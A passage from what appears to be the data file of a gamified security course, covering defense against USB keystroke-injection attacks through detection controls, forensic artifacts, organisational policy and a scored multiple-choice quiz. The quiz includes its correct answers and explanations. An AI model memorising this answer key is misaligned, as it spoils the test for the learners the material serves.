    icon: '🛡️',
    lessons: [
      {
        id: 'def-1',
        title: 'Detecting USB Attacks',
        trackId: 'defense',
        xp: 30,
        content: `# Detecting USB Attacks

Detecting USB HID attacks requires a multi-layered approach combining policy controls, monitoring, and behavioral analysis.

## Group Policy Controls (Windows)

### Disable USB Storage
\`\`\`
Computer Configuration > Administrative Templates >
System > Removable Storage Access >
All Removable Storage classes: Deny all access
\`\`\`

### Device Installation Restrictions
\`\`\`
Computer Configuration > Administrative Templates >
System > Device Installation >
Device Installation Restrictions >
Prevent installation of devices not described by other policy settings
\`\`\`

### USB Device Whitelisting
Allow only specific USB device hardware IDs:
\`\`\`
Computer Configuration > Administrative Templates >
System > Device Installation >
Allow installation of devices that match device IDs
\`\`\`

## USBGuard (Linux)

USBGuard provides USB device authorization on Linux:
\`\`\`
# Install
sudo apt install usbguard

# Generate initial policy
sudo usbguard generate-policy > /etc/usbguard/rules.conf

# Allow specific device
usbguard allow-device <device-id>

# Block new devices by default
usbguard set-parameter InsertedDevicePolicy block
\`\`\`

## Behavioral Detection

### Typing Speed Analysis
Human typing: 40-80 WPM (average)
Rubber Ducky: 1000+ WPM

Security tools can flag:
- Keystroke rates exceeding human capability
- Perfectly consistent inter-keystroke timing
- Large volumes of text typed in seconds

### Process Creation Monitoring
Monitor for suspicious process chains:
\`\`\`
New HID Device → explorer.exe → cmd.exe → powershell.exe
\`\`\`

### Sysmon Configuration
\`\`\`xml
<!-- Log USB device connections -->
<RuleGroup name="USB Device" groupRelation="or">
  <DeviceConnect onmatch="include">
    <DeviceType condition="is">USB</DeviceType>
  </DeviceConnect>
</RuleGroup>
\`\`\`

## Network Monitoring

After a USB attack, watch for:
- New outbound connections (reverse shells)
- DNS queries to unusual domains (exfiltration)
- Large data uploads
- Connections to known C2 infrastructure

## Endpoint Detection and Response (EDR)

Modern EDR solutions can detect:
- New HID device enumeration events
- Rapid keystroke injection patterns
- Suspicious command execution after USB insertion
- PowerShell execution with suspicious flags

## Physical Controls

- **USB port locks**: Physical devices that block USB ports
- **Epoxy-filled ports**: Permanent port disabling
- **USB data blockers**: Allow charging but block data
- **Controlled USB hubs**: Managed USB access points`
      },
      {
        id: 'def-2',
        title: 'Forensic Analysis',
        trackId: 'defense',
        xp: 35,
        content: `# Forensic Analysis of USB Attacks

When a USB attack is suspected, forensic analysis can reveal what happened, when, and what data may have been compromised.

## USB Device Artifacts (Windows)

### Registry Keys
USB device history is stored in several registry locations:

\`\`\`
HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USB
HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR
HKLM\\SOFTWARE\\Microsoft\\Windows Portable Devices
HKLM\\SYSTEM\\MountedDevices
\`\`\`

### Key Information Available
- **Device Vendor/Product ID**: Identifies the device model
- **Serial Number**: Unique device identifier
- **First/Last Connection Time**: When the device was used
- **Drive Letter Assignment**: What letter was assigned
- **User Account**: Which user was logged in

### SetupAPI Logs
\`\`\`
C:\\Windows\\INF\\setupapi.dev.log
\`\`\`
Contains detailed device installation events with timestamps.

## Event Logs

### Security Log (Event ID 6416)
New device connection events:
\`\`\`
Event ID: 6416
Source: Microsoft-Windows-Security-Auditing
Description: A new external device was recognized
\`\`\`

### Sysmon Events
- **Event ID 1**: Process creation (capture post-USB commands)
- **Event ID 3**: Network connections (detect C2/exfil)
- **Event ID 11**: File creation (detect dropped files)

## Keystroke Timing Analysis

### Detection Methodology
1. Capture keystroke events from system logs
2. Calculate inter-keystroke intervals
3. Analyze distribution pattern:
   - **Human**: Variable timing, normal distribution, ~50-200ms gaps
   - **Injection**: Consistent timing, very fast, ~1-5ms gaps

### Statistical Analysis
\`\`\`
Human typing standard deviation: 30-80ms
Injection standard deviation: <5ms
\`\`\`

## Timeline Reconstruction

### Step-by-Step Process
1. **Identify USB insertion time** from registry/event logs
2. **Correlate process creation** events within seconds of insertion
3. **Trace command execution** through PowerShell/CMD logs
4. **Check network connections** initiated after insertion
5. **Review file system changes** (created/modified/deleted files)
6. **Examine persistence mechanisms** (scheduled tasks, registry)

## Tools for USB Forensics

| Tool | Purpose |
|------|---------|
| **USBDeview** | View all USB device history |
| **Registry Explorer** | Deep registry analysis |
| **Sysmon** | Real-time monitoring |
| **Volatility** | Memory forensics |
| **Wireshark** | Network traffic capture |
| **Plaso/log2timeline** | Timeline creation |
| **Autopsy** | Full disk forensics |

## Evidence Collection

### Volatile Evidence (collect first)
- Running processes
- Network connections
- Memory contents
- Clipboard contents

### Non-Volatile Evidence
- Registry hives
- Event logs
- File system metadata
- Browser history
- PowerShell history file`
      },
      {
        id: 'def-3',
        title: 'Building USB Policies',
        trackId: 'defense',
        xp: 30,
        content: `# Building USB Security Policies

A comprehensive USB security policy addresses technical controls, employee training, and incident response.

## Organizational USB Policy

### Device Categories
1. **Authorized devices**: Company-issued, approved models
2. **Restricted devices**: Personal devices requiring approval
3. **Prohibited devices**: Unknown/unapproved devices

### Policy Elements
- USB port management (enabled/disabled/restricted)
- Approved device list (whitelist)
- Data transfer procedures
- Incident reporting requirements
- Consequences for violations

## Technical Controls

### Tier 1: Basic Protection
- Disable autorun/autoplay
- Enforce USB device class restrictions
- Enable endpoint logging
- Deploy basic AV with USB scanning

### Tier 2: Enhanced Protection
- USB device whitelisting
- Endpoint Detection and Response (EDR)
- PowerShell script block logging
- Process creation monitoring
- Network anomaly detection

### Tier 3: Maximum Protection
- Physical USB port locks
- USB device management platform
- Hardware-level USB filtering
- Real-time behavioral analysis
- Isolated networks for sensitive systems

## Employee Training

### Security Awareness Topics
1. **Never plug in unknown USB devices**
2. **Report found USB drives to security team**
3. **Recognize social engineering attempts** related to USB
4. **Lock workstations** when leaving desk
5. **Use only approved USB devices**
6. **Report suspicious USB behavior** (unexpected windows, typing)

### Training Methods
- Simulated USB drop tests (measure pickup rate)
- Interactive training modules
- Quarterly reminders
- Posters and visual aids
- Incident case studies

### Measuring Effectiveness
Track metrics over time:
- USB drop test success rate (should decrease)
- Incident report frequency (should increase initially)
- Policy compliance rates
- Time to report suspicious activity

## Incident Response

### USB Attack Response Playbook
1. **Isolate**: Disconnect affected device from network
2. **Preserve**: Capture volatile evidence (memory, processes)
3. **Investigate**: Analyze logs, registry, file system
4. **Contain**: Block C2 channels, remove persistence
5. **Remediate**: Reset credentials, patch vulnerabilities
6. **Report**: Document findings and timeline
7. **Improve**: Update policies based on lessons learned

### Key Questions During Response
- When was the USB device inserted?
- What commands were executed?
- Were credentials compromised?
- Was data exfiltrated?
- Is there persistence established?
- Are other systems affected?

## Compliance Frameworks

USB security maps to several compliance requirements:
- **NIST 800-53**: Media Protection (MP) controls
- **ISO 27001**: A.8 Asset Management
- **CIS Controls**: Control 10 (Malware Defenses)
- **PCI DSS**: Requirement 5 (Anti-virus)
- **HIPAA**: Device and Media Controls`
      }
    ],
    challenge: {
      id: 'def-challenge',
      trackId: 'defense',
      title: 'Defend the Network',
      description: 'Select the right countermeasures for given attack scenarios',
      type: 'multiple-choice',
      xp: 50,
      questions: [
        {
          prompt: 'An employee found a USB drive in the parking lot and plugged it in. What is the FIRST thing to do?',
          options: [
            'Format the USB drive',
            'Run an antivirus scan',
            'Disconnect the computer from the network immediately',
            'Ask the employee what they saw on screen'
          ],
          correctAnswer: 2,
          explanation: 'The first priority is containment — disconnect from the network to prevent data exfiltration and C2 communication. Then investigate.',
          hints: ['Think about what a payload might be doing RIGHT NOW', 'Network access could mean data is leaving']
        },
        {
          prompt: 'Which Windows event log entry would indicate a new USB HID device was connected?',
          options: [
            'Event ID 4624 (Login)',
            'Event ID 6416 (New external device recognized)',
            'Event ID 1102 (Audit log cleared)',
            'Event ID 7045 (Service installed)'
          ],
          correctAnswer: 1,
          explanation: 'Event ID 6416 in the Security log records when a new external device is recognized by the system, including USB HID devices.',
          hints: ['Look for device-related event IDs', 'It is in the Security log']
        },
        {
          prompt: 'What is the most effective technical control to prevent USB HID attacks?',
          options: [
            'Antivirus software',
            'Firewall rules',
            'USB device whitelisting (only allow approved keyboard models)',
            'Disabling all USB ports'
          ],
          correctAnswer: 2,
          explanation: 'USB device whitelisting allows only approved keyboard/mouse models while blocking unknown HID devices. Disabling all ports is too restrictive for most environments.',
          hints: ['You need to balance security with usability', 'Employees still need to use keyboards and mice']
        },
        {
          prompt: 'How can you distinguish between human typing and USB injection in forensic analysis?',
          options: [
            'Humans make more typos',
            'USB injection has consistent inter-keystroke timing (low standard deviation)',
            'USB injection only works in English',
            'Human typing is always slower than 10 WPM'
          ],
          correctAnswer: 1,
          explanation: 'Human typing has variable inter-keystroke intervals (high standard deviation), while injection devices type at consistent speeds with very low timing variance.',
          hints: ['Think about statistical patterns in timing', 'Machines are consistent, humans are not']
        },
        {
          prompt: 'After confirming a USB attack, what should you do BEFORE reformatting the affected machine?',
          options: [
            'Nothing — reformatting fixes everything',
            'Capture a full memory dump and disk image for forensic analysis',
            'Change the user password',
            'Update the antivirus'
          ],
          correctAnswer: 1,
          explanation: 'Forensic evidence (memory dump, disk image) must be captured BEFORE any remediation. Reformatting destroys evidence needed to understand the attack scope and improve defenses.',
          hints: ['Evidence is volatile — it can be lost', 'You need to understand what happened to prevent it again']
        }
      ]
    }
  }
]
